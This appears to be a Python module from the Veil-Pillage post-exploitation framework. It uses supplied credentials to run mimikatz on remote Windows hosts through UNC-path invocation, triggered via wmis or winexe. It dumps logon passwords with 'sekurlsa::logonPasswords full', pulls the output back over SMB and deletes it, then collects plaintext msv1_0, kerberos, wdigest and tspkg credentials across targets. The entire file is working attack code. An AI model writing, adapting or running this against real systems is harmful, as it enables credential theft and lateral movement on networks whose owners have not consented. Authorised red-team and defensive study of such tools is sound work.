"""

Tries to run Mimikatz in memory by hosting the binary
and doing \\UNC path invocation.

All credit to gentilkiwi!
    https://github.com/gentilkiwi/mimikatz


Module built by @harmj0y

"""

import time

import settings

from lib import command_methods
from lib import delivery_methods
from lib import smb
from lib import helpers

class Module:
    
    def __init__(self, targets=None, creds=None, args=None):
        
        # tuple that contains (classification 1, classification 2, ..., name)
        self.name = "Mimikatz"
        self.description = "Try to run mimikatz.exe in-memory with \\\\UNC path invocation"

        # internal list() that holds one or more targets set by the framework
        self.targets = targets

        # internal list() that holds one or more cred tuples set by the framework
        #   [ (username, pw), (username2, pw2), ...]
        self.creds = creds

        # any relevant text to echo to the output file
        self.output = ""

        #   user interaction for- format is {Option : [Value, Description]]}
        self.required_options = {   "trigger_method" :  ["wmis", "[wmis] or [winexe] for triggering"],
                                    "delay"          :  ["10", "delay (in seconds) before grabbing the results file"],
                                    "lhost"          :  ["", "local IP for [host] transport"],
                                    "out_file"       :  ["sys32.out", "temporary output filename used"]}

    def run(self):

        # assume single set of credentials for this module
        username, password = self.creds[0]

        triggerMethod = self.required_options["trigger_method"][0]
        lhost = self.required_options["lhost"][0]
        delay = self.required_options["delay"][0]
        out_file = self.required_options["out_file"][0]
        
        # the temporary output file gpp-password will write to
        if "\\" not in out_file:
            # otherwise assume it's an absolute path
            out_file = "C:\\Windows\\Temp\\" + out_file         

        # let's keep track of ALL plaintext credentials found
        allmsv, allkerberos, allwdigest, alltspkg  = [], [], [], []

        for target in self.targets:

            print "\n [*] Executing mimikatz on "+target
            # first, detect the architecture
            archCommand = "echo %PROCESSOR_ARCHITECTURE%"
            archResult = command_methods.executeResult(target, username, password, archCommand, triggerMethod)

            # if there's a failure in this initial execution, go to the next target
            if "error" in archResult:
                self.output += "[!] Mimikatz failed for "+target+" : "+archResult+"\n"
                continue

            arch = "x86"
            if "64" in archResult: arch = "x64"

            exeArgs = "\"sekurlsa::logonPasswords full\" \"exit\" >" + out_file

            # now time for mimikatz!
            mimikatzPath = settings.VEIL_PILLAGE_PATH + "/data/misc/mimikatz"+arch+".exe"

            # host the arch-correct mimikatz.exe and trigger it with the appropriate arguments
            delivery_methods.hostTrigger(target, username, password, mimikatzPath, lhost, triggerMethod=triggerMethod, exeArgs=exeArgs)

            print "\n [*] Waiting "+delay+"s for Mimikatz to run..."
            time.sleep(int(delay))

            # grab the output file and delete it
            out = smb.getFile(target, username, password, out_file, delete=True)

            # parse the mimikatz output and append it to our globals
            (msv1_0, kerberos, wdigest, tspkg) = helpers.parseMimikatz(out)

            allmsv.extend(msv1_0)
            allkerberos.extend(kerberos)
            allwdigest.extend(wdigest)
            alltspkg.extend(tspkg)

            # save the file off to the appropriate location
            saveFile = helpers.saveModuleFile(self, target, "mimikatz.txt", out)

            if out != "":
                self.output += "[*] Mimikatz results using creds '"+username+":"+password+"' on "+target+" stored at "+saveFile+"\n"
            else:
                self.output += "[!] Mimikatz failed using creds '"+username+":"+password+"' on "+target+" : no result file\n"

        # append the total mimikatz creds if we have any
        if len(allmsv) > 0:
            allmsv = sorted(set(allmsv))
            self.output += "[*] All msv1_0:\n\t" + "\n\t".join(allmsv) + "\n"
        if len(allkerberos) > 0:
            allkerberos = sorted(set(allkerberos))
            self.output += "[*] All kerberos:\n\t" + "\n\t".join(allkerberos) + "\n"
        if len(allwdigest) > 0:
            allwdigest = sorted(set(allwdigest))
            self.output += "[*] All wdigest:\n\t" + "\n\t".join(allwdigest) + "\n"
        if len(alltspkg) > 0:
            alltspkg = sorted(set(alltspkg))
            self.output += "[*] All tspkg:\n\t" + "\n\t".join(alltspkg) + "\n"

